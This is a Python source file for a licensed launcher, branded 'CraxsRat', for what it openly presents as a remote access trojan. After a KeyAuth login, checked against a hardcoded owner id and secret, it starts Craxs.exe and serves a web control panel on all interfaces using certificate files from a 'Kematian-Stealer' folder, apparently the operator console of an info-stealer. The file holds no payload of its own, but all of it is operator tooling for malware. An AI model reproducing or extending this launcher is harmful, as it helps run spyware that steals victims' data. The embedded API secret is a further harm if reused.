import os
import sys
import hashlib
import subprocess
import logging
import uvicorn
import webbrowser
from PIL import Image
from tkinter import messagebox
import customtkinter as ctk
from keyauth import api
from rich.logging import RichHandler
from rich import print
from panel.ui.modules.updater.auto_updater import AutoUpdater
from panel.server import *  # Make sure this imports `app`, `current_settings`, `good_dir`, etc.

# Function to retrieve the base path (for PyInstaller)
def get_base_path():
    if hasattr(sys, '_MEIPASS'):
        return sys._MEIPASS
    return os.path.abspath(".")

# Paths adjusted for PyInstaller-compatible usage
base_path = get_base_path()
icon_path = os.path.join(base_path, 'res', 'CraxsRat.ico')

# Initialize KeyAuth
def getchecksum():
    md5_hash = hashlib.md5()
    with open(sys.argv[0], "rb") as file:
        md5_hash.update(file.read())
    return md5_hash.hexdigest()

keyauthapp = api(
    name="CraxRat",
    ownerid="uS5XHSkOLm",
    secret="661a7c822bb4c82fcf3b8d944e7803f6564129b82e10d1ae2933a377ad39fb54",
    version="1.0",
    hash_to_check=getchecksum()
)

# Initialize the main window
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

root = ctk.CTk()
root.title("Craxsrat")
window_width = 600
window_height = 350

# Calculate position for centering the window
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

x_cordinate = int((screen_width / 2) - (window_width / 2))
y_cordinate = int((screen_height / 2) - (window_height / 2))

# Set the window size and position it centrally
root.geometry(f"{window_width}x{window_height}+{x_cordinate}+{y_cordinate}")

# Prevent window resizing
root.resizable(False, False)

# Set custom icon
if os.path.exists(icon_path):
    root.iconbitmap(icon_path)
else:
    print(f"Icon file not found at {icon_path}")

# Custom colors
red_color = "#FF0000"
blue_color = "#0080FF"
text_color = "#FFFFFF"
entry_bg_color = "#2A2A2A"
entry_fg_color = "#FF0000"
background_color = "#1C1C1C"

# Load and configure image using CTkImage for better scaling on high-DPI displays
image_path = os.path.join(base_path, 'res', 'CraxsRat.png')
original_image = Image.open(image_path)

# Default scale and position (variables you can adjust)
default_scale = 1.0
x_offset = 260
y_offset = 80

# Create a CTkImage with scaling
scaled_image = ctk.CTkImage(light_image=original_image, dark_image=original_image,
                            size=(int(original_image.width * default_scale), int(original_image.height * default_scale)))

# Function to update image scaling and position
def update_image(scale_factor=None, x_pos=None, y_pos=None):
    global scaled_image
    if scale_factor is not None:
        scaled_image = ctk.CTkImage(light_image=original_image, dark_image=original_image,
                                    size=(int(original_image.width * scale_factor), int(original_image.height * scale_factor)))
    if x_pos is not None and y_pos is not None:
        image_label.place(x=x_pos, y=y_pos)
    image_label.configure(image=scaled_image)

# Function to update the version text position and font
def update_version_text(text, x_pos=None, y_pos=None, font_size=None):
    if x_pos is not None and y_pos is not None:
        version_label.place(x=x_pos, y=y_pos)
    if font_size is not None:
        version_label.configure(font=("Arial", font_size))
    version_label.configure(text=text)

# Function to switch between frames and highlight the active button
def show_frame(frame, button):
    frame.tkraise()
    login_button_top.configure(text_color=text_color, font=("Arial", 12))
    register_button_top.configure(text_color=text_color, font=("Arial", 12))
    button.configure(text_color=blue_color, font=("Arial", 12, "underline"))

# Function to start the web server
def start_web_server():
    FORMAT = "%(message)s"
    logging.basicConfig(
        level="INFO",
        format=FORMAT,
        handlers=[RichHandler(rich_tracebacks=False, markup=True, show_time=False)],
    )
    logger = logging.getLogger("uvicorn")
    logger.handlers = []
    logger.propagate = False
    logger.setLevel(logging.INFO)
    handler = RichHandler(rich_tracebacks=False, markup=True, show_time=False)
    handler.setFormatter(logging.Formatter(FORMAT))
    logger.addHandler(handler)

    updater = AutoUpdater()
    updater.update()

    if __name__ == "__main__":
        print(
            "[bold green on black blink]If you are using this for the first time, please make sure to read the README.md file before proceeding![/bold green on black blink]"
        )

        chosen_port = current_settings.get_setting("port")
        webbrowser.open(f"https://127.0.0.1:{chosen_port}")

        try:
            uvicorn.run(
                app,
                host="0.0.0.0",
                port=int(chosen_port),
                ssl_keyfile=os.path.join(good_dir, "Kematian-Stealer", "keyfile.pem"),
                ssl_certfile=os.path.join(good_dir, "Kematian-Stealer", "certfile.pem"),
                reload=False,
                log_config=None,
            )
        except Exception as e:
            logger.error(f"An error occurred: {e}")
            logger.error("Exiting...")
            input("Press enter to exit...")
            sys.exit(1)

# Login Frame Content
def login_action():
    user = login_entry_1.get()
    password = login_entry_2.get()
    try:
        keyauthapp.login(user, password)
        messagebox.showinfo("Erfolg", "Login erfolgreich!")

        # Path to the Craxs.exe file
        Craxs_exe_path = os.path.join(base_path, 'Craxs.exe')
        
        # Check if the file exists
        if os.path.exists(Craxs_exe_path):
            # Start the Craxs.exe file
            subprocess.Popen([Craxs_exe_path], shell=True)
            # Start the web server
            start_web_server()
            root.quit()
        else:
            messagebox.showerror("Fehler", "Craxs.exe-Datei nicht gefunden.")
    except Exception as e:
        messagebox.showerror("Fehler", f"Login fehlgeschlagen: {str(e)}")

login_frame = ctk.CTkFrame(root)
register_frame = ctk.CTkFrame(root)

for frame in (login_frame, register_frame):
    frame.grid(row=0, column=0, sticky='nsew')

def create_shared_elements(frame):
    welcome_label = ctk.CTkLabel(frame, text="Welcome To Craxsrat", text_color=red_color, font=("Arial", 16))
    welcome_label.pack(pady=10)

    subtitle_label = ctk.CTkLabel(frame, text='"One Rat To Rule Them all"', text_color=text_color, font=("Arial", 10))
    subtitle_label.pack(pady=5)

    nav_frame = ctk.CTkFrame(frame, fg_color="transparent")
    nav_frame.pack(pady=10)

    global login_button_top, register_button_top
    login_button_top = ctk.CTkLabel(nav_frame, text="Login", text_color=blue_color, font=("Arial", 12, "underline"))
    login_button_top.grid(row=0, column=0, padx=10)
    login_button_top.bind("<Button-1>", lambda event: show_frame(login_frame, login_button_top))

    register_button_top = ctk.CTkLabel(nav_frame, text="Register", text_color=text_color, font=("Arial", 12))
    register_button_top.grid(row=0, column=1, padx=10)
    register_button_top.bind("<Button-1>", lambda event: show_frame(register_frame, register_button_top))

create_shared_elements(login_frame)
create_shared_elements(register_frame)

login_form_label = ctk.CTkLabel(login_frame, text="Login To Your Account", text_color=text_color, font=("Arial", 12))
login_form_label.pack(pady=10)

login_entry_1 = ctk.CTkEntry(login_frame, placeholder_text="Username", fg_color=entry_bg_color, text_color=entry_fg_color, font=("Arial", 12))
login_entry_1.pack(pady=5, padx=20)
login_entry_2 = ctk.CTkEntry(login_frame, placeholder_text="Password", fg_color=entry_bg_color, text_color=entry_fg_color, font=("Arial", 12), show="*")
login_entry_2.pack(pady=5, padx=20)

remember_me = ctk.CTkCheckBox(login_frame, text="Remember me", text_color=text_color)
remember_me.pack(pady=5)

login_button = ctk.CTkButton(login_frame, text="Login", fg_color=red_color, hover_color='#FF5555', font=("Arial", 12), command=login_action)
login_button.pack(pady=20)

# Register Frame Content
register_form_label = ctk.CTkLabel(register_frame, text="Register For Your Account", text_color=text_color, font=("Arial", 12))
register_form_label.pack(pady=10)

register_entry_1 = ctk.CTkEntry(register_frame, placeholder_text="Username", fg_color=entry_bg_color, text_color=entry_fg_color, font=("Arial", 12))
register_entry_1.pack(pady=5, padx=20)
register_entry_2 = ctk.CTkEntry(register_frame, placeholder_text="Password", fg_color=entry_bg_color, text_color=entry_fg_color, font=("Arial", 12), show="*")
register_entry_2.pack(pady=5, padx=20)
register_entry_3 = ctk.CTkEntry(register_frame, placeholder_text="License", fg_color=entry_bg_color, text_color=entry_fg_color, font=("Arial", 12))
register_entry_3.pack(pady=5, padx=20)

register_button = ctk.CTkButton(register_frame, text="Register", fg_color=red_color, hover_color='#0080FF', font=("Arial", 12))
register_button.pack(pady=20)

# Display the login frame by default
show_frame(login_frame, login_button_top)

# Update the image and version text
image_label = ctk.CTkLabel(root, text="", image=scaled_image)
image_label.place(x=x_offset, y=y_offset)

# Version text above the image (with customizable position and font size)
version_text = "Version 7.6"
version_x = 335  # Horizontal Position (Pixel)
version_y = 50  # Vertical Position (Pixel)
version_font_size = 20  # Font Size
vred_color = red_color

# Create a label for the version text
version_label = ctk.CTkLabel(root, text=version_text, text_color=vred_color, font=("Arial", version_font_size))
version_label.place(x=version_x, y=version_y)  # Place label above the image

# Start the main loop
root.mainloop()
